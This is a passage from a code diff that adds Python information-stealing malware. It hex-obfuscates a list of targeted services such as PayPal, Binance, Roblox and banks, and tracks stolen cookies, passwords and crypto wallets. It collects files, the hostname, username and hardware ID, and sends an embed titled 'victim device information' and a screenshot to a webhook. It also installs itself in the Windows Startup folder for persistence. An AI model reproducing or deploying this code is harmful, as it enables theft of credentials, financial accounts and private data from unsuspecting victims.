+    "\x5b\x72\x6f\x62\x6c\x6f\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x29",
+    "\x5b\x74\x77\x69\x74\x63\x68\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x77\x69\x74\x63\x68\x2e\x63\x6f\x6d\x29",
+    "\x5b\x6d\x69\x6e\x65\x63\x72\x61\x66\x74\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x69\x6e\x65\x63\x72\x61\x66\x74\x2e\x6e\x65\x74\x29",
+    "\x62\x61\x6e\x6b",
+    "\x5b\x70\x61\x79\x70\x61\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x79\x70\x61\x6c\x2e\x63\x6f\x6d\x29",
+    "\x5b\x6f\x72\x69\x67\x69\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x72\x69\x67\x69\x6e\x2e\x63\x6f\x6d\x29",
+    "\x5b\x61\x6d\x61\x7a\x6f\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d\x61\x7a\x6f\x6e\x2e\x63\x6f\x6d\x29",
+    "\x5b\x65\x62\x61\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x62\x61\x79\x2e\x63\x6f\x6d\x29",
+    "\x5b\x61\x6c\x69\x65\x78\x70\x72\x65\x73\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6c\x69\x65\x78\x70\x72\x65\x73\x73\x2e\x63\x6f\x6d\x29",
+    "\x5b\x70\x6c\x61\x79\x73\x74\x61\x74\x69\x6f\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6c\x61\x79\x73\x74\x61\x74\x69\x6f\x6e\x2e\x63\x6f\x6d\x29",
+    "\x5b\x68\x62\x6f\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x62\x6f\x2e\x63\x6f\x6d\x29",
+    "\x5b\x78\x62\x6f\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x62\x6f\x78\x2e\x63\x6f\x6d\x29",
+    "\x62\x75\x79",
+    "\x73\x65\x6c\x6c",
+    "\x5b\x62\x69\x6e\x61\x6e\x63\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x69\x6e\x61\x6e\x63\x65\x2e\x63\x6f\x6d\x29",
+    "\x5b\x68\x6f\x74\x6d\x61\x69\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6f\x74\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x29",
+    "\x5b\x6f\x75\x74\x6c\x6f\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x75\x74\x6c\x6f\x6f\x6b\x2e\x63\x6f\x6d\x29",
+    "\x5b\x63\x72\x75\x6e\x63\x68\x79\x72\x6f\x6c\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x72\x75\x6e\x63\x68\x79\x72\x6f\x6c\x6c\x2e\x63\x6f\x6d\x29",
+    "\x5b\x74\x65\x6c\x65\x67\x72\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x63\x6f\x6d\x29",
+    "\x5b\x70\x6f\x72\x6e\x68\x75\x62\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d\x29",
+    "\x5b\x64\x69\x73\x6e\x65\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x6e\x65\x79\x2e\x63\x6f\x6d\x29",
+    "\x5b\x65\x78\x70\x72\x65\x73\x73\x76\x70\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x70\x72\x65\x73\x73\x76\x70\x6e\x2e\x63\x6f\x6d\x29",
+    "\x63\x72\x79\x70\x74\x6f",
+    "\x5b\x75\x62\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x62\x65\x72\x2e\x63\x6f\x6d\x29",
+    "\x5b\x6e\x65\x74\x66\x6c\x69\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x66\x6c\x69\x78\x2e\x63\x6f\x6d\x29",
+]
+
+CookiCount, PasswCount = 0, 0
+cookiWords = []
+paswWords = []
+
+WalletsZip = []
+GamingZip = []
+OtherZip = []
+
+GatherAll()
+DETECTED = Trust(Cookies)
+if not DETECTED:
+    wikith = Kiwi()
+
+    for thread in wikith:
+        thread.join()
+
+    time.sleep(0.2)
+
+    filetext = "\n"
+    for arg in KiwiFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]
+            filetext += f"📁 {foldpath}\n"
+
+            for ffil in foldlist:
+                a = ffil[0].split("/")
+                fileanme = a[len(a), 1]
+                b = ffil[1]
+                filetext += f"└─\x3a\x6f\x70\x65\x6e\x5f\x66\x69\x6c\x65\x5f\x66\x6f\x6c\x64\x65\x72\x3a [{fileanme}]({b})\n"
+            filetext += "\n"
+    upload("\x6b\x69\x77\x69", filetext)
+
+username = getpass.getuser()
+
+hostname = socket.gethostname()
+
+import subprocess
+
+command = "wmic csproduct get uuid"
+output = str(subprocess.check_output(command, shell=True), "utf-8")
+hwid = output.split("\n")[1].strip()
+
+import subprocess
+
+command = "wmic csproduct get name"
+output = str(subprocess.check_output(command, shell=True), "utf-8")
+name = output.split("\n")[1].strip()
+
+
+import platform
+import subprocess
+
+hostname = platform.node()
+username = platform.node()
+hwid = str(subprocess.check_output("wmic csproduct get uuid", shell=True), "utf-8").split("\n")[1].strip()
+
+embed = {
+    "title": "معلومات جهاز الضحية",
+    "color": 0,
+    "fields": [
+        {
+            "name": "الاسم",
+            "value": f"```\nHost Name: {hostname}\n\nUser Name: {username}```",
+            "inline": True,
+        },
+        {
+            "name": "النظام",
+            "value": f"```\nOS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
+            "inline": True,
+        },
+    ],
+}
+
+
+import requests
+from PIL import ImageGrab
+import os
+
+# Envoi du contenu JSON
+requests.post(whook, json={"embeds": [embed]})
+
+# Capture d'écran
+screenshot = ImageGrab.grab()
+screenshot.save("screenshot.png")
+
+# Envoi du fichier
+files = {"file": open("screenshot.png", "rb")}
+requests.post(whook, files=files)
+files["file"].close()
+
+# Suppression du fichier
+os.remove("screenshot.png")
+
+# Payload
+payload = {"content": "https://discord.gg/msn"}
+
+import requests
+import os
+import shutil
+
+# Envoi de la requête POST avec le payload
+response = requests.post(whook, json=payload)
+
+# Récupération du répertoire de l'utilisateur
+home_dir = os.path.expanduser('~')
+
+# Construction du chemin vers le dossier de démarrage
+startup_folder = os.path.join(home_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+# Chemin source du fichier à copier
+src_file_path = 'C:/Desktop/main.py'
+
+# Chemin destination du fichier dans le dossier de démarrage
+dst_file_path = os.path.join(startup_folder, 'main.py')
+
+# Copie du fichier vers le dossier de démarrage
+shutil.copyfile(src_file_path, dst_file_path)
